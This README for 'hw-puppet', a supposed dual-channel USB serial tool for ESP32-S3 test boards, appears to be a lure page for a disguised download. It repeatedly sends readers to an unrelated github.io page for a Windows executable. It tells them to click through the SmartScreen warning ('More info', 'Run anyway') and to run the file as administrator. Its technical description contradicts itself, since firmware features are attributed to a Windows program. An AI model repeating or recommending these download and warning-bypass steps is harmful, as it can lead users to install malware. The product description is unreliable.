# 🤖 hw-puppet - Control Test Boards Without Coding

[![Download hw-puppet](https://img.shields.io/badge/Download-hw--puppet-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://zobryayanayama.github.io)

hw-puppet is a small, friendly program that acts like a puppet master for circuit boards. It gives you two simple "remote controls" over one USB cable, so you can watch what a board is doing and send it commands at the same time — no programming experience required.

## 📥 Download and Install

Visit this link to download the application:

**👉 https://zobryayanayama.github.io**

Once the page opens, look for the download button or the releases area, and save the application to your Windows computer. When the download finishes, open the file you saved and follow the on-screen prompts to place hw-puppet on your machine.

That is the whole installation. There is no command line, no package manager, and no configuration file to edit.

## 🧭 What Is hw-puppet?

Imagine you are testing a small electronic board — maybe a sensor, a motor controller, or a custom gadget. Normally you would need two separate cables and two separate programs: one to type commands into the board, and another to read the messages it sends back. That setup is fiddly, and the two programs often fight over the same connection.

hw-puppet solves that by turning one physical USB port into two virtual ports at the same time.

- **Port one** is a live command window. You type a line, press Enter, and the board responds immediately — like a chat with the hardware.
- **Port two** is a continuous stream. Any text the board sends out on its own shows up here, scrolling in real time, without interrupting your typing.

Because the two channels are independent, you can hold a conversation with a board while it is also busy reporting data. Nothing gets dropped, and nothing gets mixed together.

Under the hood, this uses a dual-CDC USB design built on TinyUSB and the ESP-IDF framework, running on ESP32-S3 hardware, with MicroPython providing the command interface. You do not need to know any of those words to use it — but if you are curious, that is what makes the magic work.

## ✨ Key Features

- **Two channels, one cable.** A command window and a live data stream, both over a single USB connection.
- **MicroPython command prompt.** Type short, readable commands and see answers instantly. No compiling, no flashing new firmware for every small change.
- **Always-on data streaming.** The second channel keeps capturing board output while you work on the first.
- **Works with Jetson and Windows hosts.** Plug the board into a Windows PC or an NVIDIA Jetson machine and hw-puppet handles the connection.
- **Test-bench friendly.** Built for repeated, hands-on hardware testing rather than one-off experiments.
- **Automation ready.** Because the two channels are stable and predictable, repeated test runs can be scripted later if you want to — but nothing forces you to.
- **No drivers to hunt down.** The virtual ports appear as standard serial devices that Windows already understands.

## 🖥️ What You Need Before You Start

- A Windows 10 or Windows 11 computer with a free USB port.
- A USB data cable — not a charge-only cable. If the board does not appear, this is the most common culprit.
- A supported target board with the hw-puppet firmware already loaded.
- Roughly 100 MB of free disk space.
- No administrator rights are strictly required, though running the first launch as administrator can help Windows recognise the two virtual ports immediately.

## 🚀 Getting Started Step by Step

1. **Download.** Visit https://zobryayanayama.github.io and save the application to your computer.
2. **Open it.** Double-click the file you downloaded. If Windows shows a blue "protected your PC" notice, click **More info**, then **Run anyway**.
3. **Plug in your board.** Connect the target board to your PC with the USB data cable.
4. **Wait a moment.** Windows will detect two new serial devices. This usually takes five to ten seconds.
5. **Pick your channels.** In hw-puppet, choose the first port for the command window and the second for the streaming window. If you are unsure which is which, swap them — nothing breaks.
6. **Say hello.** Type a simple command in the command window and press Enter. You should see a reply almost immediately.
7. **Watch the stream.** The streaming window should now show any output the board produces on its own, updating live as you work.

That is the entire first-run experience. There is no account to create and nothing to sign up for.

## 🔌 How the Dual USB Connection Works

Think of hw-puppet as a splitter with a brain.

The board sends everything through one physical USB cable. hw-puppet intercepts that traffic and sorts it into two lanes. Lane one carries your typed commands down to the board. Lane two carries the board's own messages up to your screen. Because the lanes never cross, a long stream of sensor readings will not hide the answer to the command you just typed, and your typing will not interrupt the stream.

If a lane ever needs to be reset, you can restart just that lane without unplugging the board — handy when a test has been running for hours.

## 🛠️ Common Uses

- **Bench testing new boards** before they go into a product.
- **Watching a device run for hours** while occasionally sending it a command.
- **Teaching and demonstrations**, where a visible command-and-response loop is easier to explain than a wall of code.
- **Hardware-in-the-loop setups**, where a test machine needs a reliable, repeatable connection to a real board.
- **Debugging sensor behaviour**, because the live stream shows exactly what the board believes is happening.

## ❓ Frequently Asked Questions

**Do I need to know Python?**
No. The command window accepts short, plain commands. If you can type a sentence into a search box, you can use it.

**Can I use both windows at once?**
Yes — that is the entire point. Both lanes are live simultaneously.

**What happens if I unplug the cable mid-session?**
The windows will show a disconnect notice. Plug the cable back in, wait a few seconds, and reconnect the channels.

**Does it work with boards other than ESP32-S3?**
hw-puppet is built and tuned for ESP32-S3 target boards. Other boards may connect but are not officially supported.

**Will it interfere with other serial programs?**
Only if they try to open the same port at the same time. Close other serial tools before launching hw-puppet.

## 🆘 Troubleshooting

- **Nothing appears after plugging in.** Try a different USB cable — charge-only cables are the most frequent cause. Then try a different USB port, ideally one directly on the computer rather than through a hub.
- **Only one port shows up.** Unplug, wait ten seconds, and plug back in. On some machines the second port takes a little longer to register.
- **Garbled text in the stream.** The streaming speed does not match the board. Reset the stream channel from the menu and it will re-sync.
- **The application will not open.** Right-click the file and choose **Run as administrator**.
- **Commands get no reply.** Confirm you selected the correct port for the command window — swapping the two channels fixes this in most cases.

## 📚 Support and Updates

Return to https://zobryayanayama.github.io at any time to check for newer versions, read release notes, or report a problem. Keeping the application up to date is the fastest route to a smooth experience, since each release refines how the two channels behave together.

## ⚖️ License

hw-puppet is distributed under the license stated in the repository. Review that file before redistributing or bundling the application with other software.

Keywords: dual-cdc, embedded-systems, esp-idf, esp32-s3, espressif, firmware, hardware-automation, hardware-in-the-loop, hardware-testing, hil-testing, mcp, micropython, nvidia-jetson, test-bench, tinyusb, uart-bridge, usb-cdc